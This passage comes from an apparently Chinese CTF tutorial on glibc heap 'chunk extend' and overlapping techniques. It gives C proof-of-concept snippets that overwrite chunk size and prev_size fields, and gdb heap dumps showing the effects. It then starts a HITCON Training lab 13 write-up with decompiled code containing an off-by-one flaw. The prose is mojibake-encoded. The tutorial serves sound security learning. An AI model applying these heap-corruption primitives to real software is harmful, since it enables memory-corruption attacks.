chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</code></pre><p>å³æŸ¥çœ‹ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse åŸŸï¼Œè€Œä¸‹ä¸€å—åœ°å€åˆå¦‚æˆ‘ä»¬å‰é¢æ‰€è¿°æ˜¯æ ¹æ®å½“å‰chunk size è®¡ç®—å¾—å‡º</p><p>é€šè¿‡ä¸Šé¢å‡ ä¸ªå®å¯ä»¥çœ‹å‡ºï¼Œptmalloc é€šè¿‡ chunk header çš„æ•°æ®åˆ¤æ–­ chunk çš„ä½¿ç”¨æƒ…å†µå’Œå¯¹chunk çš„å‰åå—è¿›è¡Œå®šä½ã€‚ç®€è€Œè¨€ä¹‹ï¼Œchunk extend å°±æ˜¯é€šè¿‡æ§åˆ¶ size å’Œ prev_size åŸŸæ¥å®ç°è·¨è¶Šå—æ“ä½œä»è€Œå¯¼è‡´ overlappingçš„ã€‚</p><p>ä¸ chunk extend ç±»ä¼¼çš„è¿˜æœ‰ä¸€ç§ç§°ä¸º chunk shrink çš„æ“ä½œã€‚è¿™é‡Œåªä»‹ç» chunk extend çš„åˆ©ç”¨ã€‚</p><h2 id="åŸºæœ¬ç¤ºä¾‹1ï¼šå¯¹-inuse-çš„fastbin-è¿›è¡Œextend">åŸºæœ¬ç¤ºä¾‹1ï¼šå¯¹ inuse çš„fastbin è¿›è¡Œextend<a class="post-anchor" href="#åŸºæœ¬ç¤ºä¾‹1ï¼šå¯¹-inuse-çš„fastbin-è¿›è¡Œextend"></a></h2><p>ç®€å•æ¥è¯´ï¼Œè¯¥åˆ©ç”¨çš„æ•ˆæœæ˜¯é€šè¿‡æ›´æ”¹ç¬¬ä¸€ä¸ªå—çš„å¤§å°æ¥æ§åˆ¶ç¬¬äºŒä¸ªå—çš„å†…å®¹ã€‚<strong>æ³¨æ„ï¼Œæˆ‘ä»¬çš„ç¤ºä¾‹éƒ½æ˜¯åœ¨ 64 ä½çš„ç¨‹åºã€‚å¦‚æœæƒ³åœ¨32ä½ä¸‹è¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥æŠŠ 8 å­—èŠ‚åç§»æ”¹ä¸º 4 å­—èŠ‚ã€‚</strong></p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<span class="hljs-comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span>    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>å½“ä¸¤ä¸ª malloc è¯­å¥æ‰§è¡Œä¹‹åï¼Œå †çš„å†…å­˜åˆ†å¸ƒå¦‚ä¸‹</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <span class="hljs-number">1</span><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <span class="hljs-number">2</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fc1</span> &lt;=== top chunk</code></pre><p>ä¹‹åï¼Œæˆ‘ä»¬ä¼šæŠŠ chunk1 çš„ size åŸŸæ›´æ”¹ä¸º 0x41ï¼Œ0x41 æ˜¯å› ä¸º chunk çš„ size åŸŸåŒ…å«äº†ç”¨æˆ·æ§åˆ¶çš„å¤§å°å’Œ header çš„å¤§å°ã€‚å¦‚ä¸Šæ‰€ç¤ºæ­£å¥½å¤§å°ä¸º 0x40.åœ¨é¢˜ç›®ä¸­è¿™ä¸€æ­¥å¯ä»¥ç”±å †æº¢å‡ºå¾—åˆ°ã€‚</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== ç¯¡æ”¹å¤§å°<span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fc1</span></code></pre><p>æ‰§è¡Œ free ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° chunk2 ä¸ chunk1 åˆæˆä¸€ä¸ª 0x40 å¤§å°çš„ chunkï¼Œä¸€èµ·é‡Šæ”¾äº†ã€‚</p><pre><code class="hljs assembly">Fastbins[idx=0, size=0x10] 0x00Fastbins[idx=1, size=0x20] 0x00Fastbins[idx=2, size=0x30]  â†  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE)Fastbins[idx=3, size=0x40] 0x00Fastbins[idx=4, size=0x50] 0x00Fastbins[idx=5, size=0x60] 0x00Fastbins[idx=6, size=0x70] 0x00</code></pre><p>ä¹‹åæˆ‘ä»¬é€šè¿‡ malloc(0x30) å¾—åˆ° chunk1 + chunk2 çš„å—ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥æ§åˆ¶ chunk2 ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¹ŸæŠŠè¿™ç§çŠ¶æ€ç§°ä¸º overlapping chunkã€‚</p><pre><code class="hljs assembly">call   0x400450 &lt;malloc@plt&gt;mov    QWORD PTR [rbp-0x8], raxrax = 0x602010</code></pre><h2 id="åŸºæœ¬ç¤ºä¾‹2ï¼šå¯¹-inuse-çš„-smallbin-è¿›è¡Œ-extend">åŸºæœ¬ç¤ºä¾‹2ï¼šå¯¹ inuse çš„ smallbin è¿›è¡Œ extend<a class="post-anchor" href="#åŸºæœ¬ç¤ºä¾‹2ï¼šå¯¹-inuse-çš„-smallbin-è¿›è¡Œ-extend"></a></h2><p>é€šè¿‡ä¹‹å‰æ·±å…¥ç†è§£å †çš„å®ç°éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘ä»¬å¾—çŸ¥å¤„äº fastbin èŒƒå›´çš„ chunk é‡Šæ”¾åä¼šè¢«æ¤å…¥ fastbin é“¾è¡¨ä¸­ã€‚ä»¥ä¸‹è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ 0x80 è¿™ä¸ªå¤§å°æ¥åˆ†é…å †ï¼ˆä½œä¸ºå¯¹æ¯”ï¼Œfastbin é»˜è®¤çš„æœ€å¤§çš„ chunk å¯ä½¿ç”¨çš„èŒƒå›´æ˜¯ 0x70ï¼‰</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);&#125;</code></pre><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå› ä¸ºåˆ†é…çš„ size ä¸å¤„äº fastbin çš„èŒƒå›´ï¼Œå› æ­¤åœ¨é‡Šæ”¾æ—¶å¦‚æœä¸ top chunk ç›¸è¿ä¼šå¯¼è‡´å’Œ top chunk åˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é¢å¤–åˆ†é…ä¸€ä¸ªchunk ï¼ŒæŠŠé‡Šæ”¾çš„å—ä¸ top chunk éš”å¼€ã€‚</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 ç¯¡æ”¹sizeåŸŸ0x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== é˜²æ­¢åˆå¹¶çš„chunk0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</code></pre><p>é‡Šæ”¾åï¼Œchunk1 æŠŠ chunk2 çš„å†…å®¹åå¹¶æ‰å¹¶ä¸€èµ·ç½®å…¥ unsorted bin</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== è¢«æ”¾å…¥unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x00000000000000210x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== æ³¨æ„æ­¤å¤„æ ‡è®°ä¸ºç©º0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</code></pre><pre><code class="hljs assembly">[+] unsorted_bins[0]: fw=0x602000, bk=0x602000 â†’   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)</code></pre><p>å†æ¬¡è¿›è¡Œåˆ†é…çš„æ—¶å€™å°±ä¼šå–å› chunk1 å’Œ chunk2 çš„ç©ºé—´ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ chunk2 ä¸­çš„å†…å®¹</p><pre><code class="hljs assembly">    0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;â†’   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax    rax : 0x0000000000602010</code></pre><h2 id="åŸºæœ¬ç¤ºä¾‹3ï¼šå¯¹-free-çš„-smallbin-è¿›è¡Œ-extend">åŸºæœ¬ç¤ºä¾‹3ï¼šå¯¹ free çš„ smallbin è¿›è¡Œ extend<a class="post-anchor" href="#åŸºæœ¬ç¤ºä¾‹3ï¼šå¯¹-free-çš„-smallbin-è¿›è¡Œ-extend"></a></h2><p>ç¤ºä¾‹3 æ˜¯åœ¨ç¤ºä¾‹2 çš„åŸºç¡€ä¸Šè¿›è¡Œçš„ï¼Œè¿™æ¬¡æˆ‘ä»¬å…ˆé‡Šæ”¾ chunk1ï¼Œç„¶åå†ä¿®æ”¹å¤„äº unsorted bin ä¸­çš„ size åŸŸã€‚</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x80çš„chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk2</span>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//é¦–å…ˆè¿›è¡Œé‡Šæ”¾ï¼Œä½¿å¾—chunk1è¿›å…¥unsorted bin</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);&#125;</code></pre><p>ä¸¤æ¬¡ malloc ä¹‹åçš„ç»“æœå¦‚ä¸‹</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51</code></pre><p>æˆ‘ä»¬é¦–å…ˆé‡Šæ”¾ chunk1 ä½¿ä»–è¿›å…¥ unsorted bin ä¸­</p><pre><code class="hljs assembly">     unsorted_bins[0]: fw=0x602000, bk=0x602000 â†’   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== è¿›å…¥unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</code></pre><p>ç„¶å ç¯¡æ”¹ chunk1 çš„ size åŸŸ</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x00000000000000b1</span> &lt;=== sizeåŸŸè¢«ç¯¡æ”¹<span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x00007ffff7dd1b78</span>  <span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000000090</span>  <span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f51</span></code></pre><p>æ­¤æ—¶å†è¿›è¡Œ malloc åˆ†é…å°±å¯ä»¥å¾—åˆ° chunk1+chunk2 çš„å †å—ï¼Œä»è€Œæ§åˆ¶äº† chunk2 çš„å†…å®¹ã€‚</p><h2 id="Chunk-Extend-Shrink-å¯ä»¥åšä»€ä¹ˆ">Chunk Extend/Shrink å¯ä»¥åšä»€ä¹ˆ<a class="post-anchor" href="#Chunk-Extend-Shrink-å¯ä»¥åšä»€ä¹ˆ"></a></h2><p> ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§æŠ€æœ¯å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶ chunk ä¸­çš„å†…å®¹ã€‚å¦‚æœ chunk å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›è¡Œä¿¡æ¯æ³„éœ²å’Œæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚</p><p>æ­¤å¤–é€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping ï¼Œé€šè¿‡ overlapping å¯ä»¥æ§åˆ¶ chunk çš„ fd/bk æŒ‡é’ˆä»è€Œå¯ä»¥å®ç° fastbin attack ç­‰åˆ©ç”¨ã€‚</p><h2 id="åŸºæœ¬ç¤ºä¾‹4ï¼šé€šè¿‡-extend-åå‘-overlapping">åŸºæœ¬ç¤ºä¾‹4ï¼šé€šè¿‡ extend åå‘ overlapping<a class="post-anchor" href="#åŸºæœ¬ç¤ºä¾‹4ï¼šé€šè¿‡-extend-åå‘-overlapping"></a></h2><p>è¿™é‡Œå±•ç¤ºé€šè¿‡ extend è¿›è¡Œåå‘ overlappingï¼Œè¿™ä¹Ÿæ˜¯åœ¨ CTF ä¸­æœ€å¸¸å‡ºç°çš„æƒ…å†µï¼Œé€šè¿‡ overlapping å¯ä»¥å®ç°å…¶ä»–çš„ä¸€äº›åˆ©ç”¨ã€‚</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//åˆ†é…ç¬¬1ä¸ª 0x80 çš„chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//åˆ†é…ç¬¬2ä¸ª 0x10 çš„chunk2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//åˆ†é…ç¬¬3ä¸ª 0x10 çš„chunk3</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//åˆ†é…ç¬¬4ä¸ª 0x10 çš„chunk4    </span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);&#125;</code></pre><p>åœ¨ malloc(0x50) å¯¹ extend åŒºåŸŸé‡æ–°å ä½åï¼Œå…¶ä¸­ 0x10 çš„fastbin å—ä¾ç„¶å¯ä»¥æ­£å¸¸çš„åˆ†é…å’Œé‡Šæ”¾ï¼Œæ­¤æ—¶å·²ç»æ„æˆ overlappingï¼Œé€šè¿‡å¯¹ overlapping çš„è¿›è¡Œæ“ä½œå¯ä»¥å®ç° fastbin attackã€‚</p><h2 id="åŸºæœ¬ç¤ºä¾‹5ï¼šé€šè¿‡extend-å‰å‘-overlapping">åŸºæœ¬ç¤ºä¾‹5ï¼šé€šè¿‡extend å‰å‘ overlapping<a class="post-anchor" href="#åŸºæœ¬ç¤ºä¾‹5ï¼šé€šè¿‡extend-å‰å‘-overlapping"></a></h2><p>è¿™é‡Œå±•ç¤ºé€šè¿‡ä¿®æ”¹ pre_inuse åŸŸå’Œ pre_size åŸŸå®ç°åˆå¹¶å‰é¢çš„å—ã€‚</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin1</span>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin1</span>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin2</span>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//é˜²æ­¢ä¸topåˆå¹¶</span>    <span class="hljs-built_in">free</span>(ptr1);    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;<span class="hljs-comment">//ä¿®æ”¹pre_inuseåŸŸ</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;<span class="hljs-comment">//ä¿®æ”¹pre_sizeåŸŸ</span>    <span class="hljs-built_in">free</span>(ptr4);<span class="hljs-comment">//unlinkè¿›è¡Œå‰å‘extend</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);<span class="hljs-comment">//å ä½å—</span>&#125;</code></pre><p>å‰å‘ extend åˆ©ç”¨äº† small bin çš„ unlink æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹ pre_size åŸŸå¯ä»¥è·¨è¶Šå¤šä¸ªchunk è¿›è¡Œåˆå¹¶å®ç° overlappingã€‚</p><h2 id="HITCON-Training-lab-13">HITCON Training lab 13<a class="post-anchor" href="#HITCON-Training-lab-13"></a></h2><p>ç¨‹åºä¸º 64 ä½åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œä¸»è¦å¼€å¯äº† Canary ä¿æŠ¤ä¸ NX ä¿æŠ¤ã€‚</p><p><strong>ç¨‹åºé€»è¾‘</strong></p><pre><code class="hljs bash">--------------------------------          Heap Creator          -------------------------------- 1. Create a Heap                2. Edit a Heap                  3. Show a Heap                  4. Delete a Heap                5. Exit                        --------------------------------</code></pre><p><strong>åˆ›å»ºå †</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">create_heap</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span>  <span class="hljs-keyword">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )  &#123;    <span class="hljs-keyword">if</span> ( !heaparray[i] )    &#123;      heaparray[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-keyword">if</span> ( !heaparray[i] )      &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);      &#125;      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);      read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);      size = atoi(&amp;buf);      v0 = heaparray[i];      v0[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(size);      <span class="hljs-keyword">if</span> ( !*((_QWORD *)heaparray[i] + <span class="hljs-number">1</span>) )      &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);      &#125;      *(_QWORD *)heaparray[i] = size;      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>, &amp;buf);      read_input(*((_QWORD *)heaparray[i] + <span class="hljs-number">1</span>), size);      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;    &#125;  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;&#125;</code></pre><p><strong>ç¼–è¾‘å †ï¼Œæ¯”ä¹‹å‰åˆ›å»ºå †æ—¶çš„sizeå¤šè¯»å…¥äº†ä¸€ä¸ªå­—èŠ‚ï¼Œé€ æˆ off-by-one</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">edit_heap</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>LL);  v1 = atoi(&amp;buf);  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">9</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);    _exit(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">if</span> ( heaparray[v1] )  &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>, &amp;buf);    read_input(*((_QWORD *)heaparray[v1] + <span class="hljs-number">1</span>), *(_QWORD *)heaparray[v1] + <span class="hljs-number">1L</span>L);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre><h3 id="åŸºæœ¬åŠŸèƒ½">åŸºæœ¬åŠŸèƒ½<a class="post-anchor" href="#åŸºæœ¬åŠŸèƒ½"></a></h3><p>ç¨‹åºå¤§æ¦‚æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„å †åˆ†é…å™¨ï¼Œæ¯ä¸ªå †ä¸»è¦æœ‰ä¸¤ä¸ªæˆå‘˜ï¼šå¤§å°ä¸å†…å®¹æŒ‡é’ˆã€‚ä¸»è¦åŠŸèƒ½å¦‚ä¸‹</p><ol><li>åˆ›å»ºå †ï¼Œæ ¹æ®ç”¨æˆ·è¾“å…¥çš„é•¿åº¦ï¼Œç”³è¯·å¯¹åº”å†…å­˜ç©ºé—´ï¼Œå¹¶åˆ©ç”¨read è¯»å–æŒ‡å®šé•¿åº¦å†…å®¹ã€‚è¿™é‡Œé•¿åº¦æ²¡æœ‰è¿›è¡Œæ£€æµ‹ï¼Œå½“é•¿åº¦ä¸ºè´Ÿæ•°çš„æ—¶å€™ï¼Œä¼šå‡ºç°ä»»æ„é•¿åº¦å †æº¢å‡ºçš„æ¼æ´ã€‚å½“å‰ï¼Œå‰ææ˜¯å¯ä»¥è¿›è¡Œ mallocã€‚æ­¤å¤–ï¼Œè¿™é‡Œè¯»å–ä¹‹åå¹¶æ²¡æœ‰è®¾ç½® NULLã€‚</li><li>ç¼–è¾‘å †ï¼Œæ 